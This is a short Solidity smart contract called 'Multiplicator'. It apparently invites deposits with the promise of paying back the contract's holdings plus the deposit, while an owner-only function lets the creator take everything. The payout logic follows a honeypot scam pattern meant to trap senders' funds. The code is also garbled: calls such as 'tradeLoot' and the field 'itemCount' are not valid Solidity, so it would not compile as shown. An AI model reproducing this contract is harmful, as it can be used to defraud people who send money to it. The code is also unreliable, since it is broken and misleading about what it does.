// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Gamemaster = msg.sender;

    function()payable{}

    function claimLoot()
    payable
    public
    {
        require(msg.sender == Gamemaster);
        Gamemaster.tradeLoot(this.itemCount);
    }

    function multiplicate(address adr)
    payable
    {
        if(msg.value>=this.itemCount)
        {
            adr.tradeLoot(this.itemCount+msg.value);
        }
    }
}